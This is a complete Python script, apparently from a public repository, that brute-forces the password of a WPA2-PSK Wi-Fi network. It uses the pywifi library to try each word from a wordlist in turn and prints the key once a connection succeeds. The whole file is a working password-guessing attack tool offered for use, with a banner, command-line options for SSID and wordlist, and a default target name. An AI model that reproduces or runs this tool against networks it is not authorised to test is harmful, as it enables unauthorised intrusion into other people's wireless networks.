"""
    Wi-Fi Brute Force Authenticator
"""

# Import librairies
import argparse, time, sys, os, platform, re, subprocess
import pywifi
import termcolor, pyfiglet

# Fancy App Presentation 
f = pyfiglet.Figlet(font='standard')
print(termcolor.colored(f.renderText('WiFi Brute Force'), color='yellow'))
print(termcolor.colored('Author: Landry John [https://github.com/landryjohn]', color='yellow'))
print(termcolor.colored('Thanks: OpenSource Community', color='green'))

input('Press enter to continue >')

# Default settings  
_ssid="WIFI-NT-SSID"
_wordlist="./wordlist.txt"

def attempt_login(ssid:str, wordlist_file:str) -> None:
    step = 0
    with open(wordlist_file, 'r', encoding='utf-8') as wordlist:
        for word in wordlist:
            step += 1 
            password = word.replace('\n', '')
            wconnection(ssid, password, step)

def wconnection(ssid:str, password:str, wordlist_step:int) -> None: 
    profile = pywifi.Profile() # Create a new profile
    # Assign profile settings
    profile.ssid = ssid 
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK) # Set the key management system 
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP # (Counter-Mode/CBC-Mac protocol) Based AES encryption protocol
    profile.key = password

    profile = iface.add_network_profile(profile) # Add the current profile to the wireless interface
    
    time.sleep(0.1)
    iface.connect(profile) # Attempt to connect to the wireless network 
    time.sleep(2) # wait until 2 seconds

    if iface.status() == pywifi.const.IFACE_CONNECTED : 
        print(termcolor.colored(f"Step {wordlist_step}: [*] Connected successfully to ssid={ssid}:key={password}", 'green'))
        input()
    else :
        print(termcolor.colored(f"Step {wordlist_step}: [!] Password {password} failed ! trying the next one.", 'red'))

def main(ssid:str, wordlist:str):
    # Instantiate argument parser
    parser = argparse.ArgumentParser()

    # Adding switches
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = Access Point Name')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='file list of passwords')

    args = parser.parse_args()

    # Checking gived parameters 
    if args.ssid and args.wordlist :
        ssid = args.ssid 
        wordlist = args.wordlist 
    elif not args.ssid and args.wordlist :
        ssid = _ssid
        wordlist = args.wordlist 
    elif args.ssid and not args.wordlist :
        ssid = args.ssid
        wordlist = _wordlist 
    else : 
        ssid = _ssid
        wordlist = _wordlist
    
    # Verify wordlist parameter
    if os.path.exists(wordlist):
        # if 'win' in platform.system().lower(): 
        #     os.system('cls')
        # else : 
        #     os.system('clear')
        attempt_login(ssid,wordlist)
    else : 
        print(termcolor.colored(f"[-] Error : File {wordlist} doesn't exist", 'red'))

if __name__ == "__main__" : 

    # try: 
    # Get the Wi-FIi interface 
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0] # Get the first available wifi interface 
    iface.disconnect() # Disconnect the interface to the current AP 
        
    main(_ssid, _wordlist)
        
    # except Exception as error:
    #     print(error)




